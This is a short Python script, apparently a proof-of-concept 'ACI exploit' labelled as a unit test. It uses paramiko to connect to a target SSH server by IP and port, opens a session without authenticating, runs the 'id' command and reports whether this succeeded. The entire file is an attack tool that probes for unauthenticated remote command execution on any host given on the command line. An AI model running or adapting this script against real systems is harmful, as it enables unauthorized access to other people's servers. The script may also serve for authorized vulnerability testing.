import paramiko
import socket
import sys

def exploit_ssh(target_ip, target_port):
    try:
        # Create a new SSH client
        client = paramiko.SSHClient()
        # Set SSH key parameters to auto accept unknown keys
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        
        # Start a session over the socket without authentication
        session = paramiko.Transport(sock)
        session.start_client()
        
        # Try to open a channel without authentication
        channel = session.open_session()
        channel.exec_command('id')  # This should not be allowed without auth
        output = channel.makefile('rb', 2048).read()
        
        if output:
            print('The ACI exploit success!!!')
        else:
            print('The ACI exploit failed!!!')
            
    except Exception as e:
        print('The ACI exploit failed!!!')
        print(str(e))
    finally:
        if 'channel' in locals():
            channel.close()
        if 'session' in locals():
            session.close()
        if 'sock' in locals():
            sock.close()

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python ACI_unit_test.py <target_ip> <target_port>")
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    exploit_ssh(target_ip, target_port)
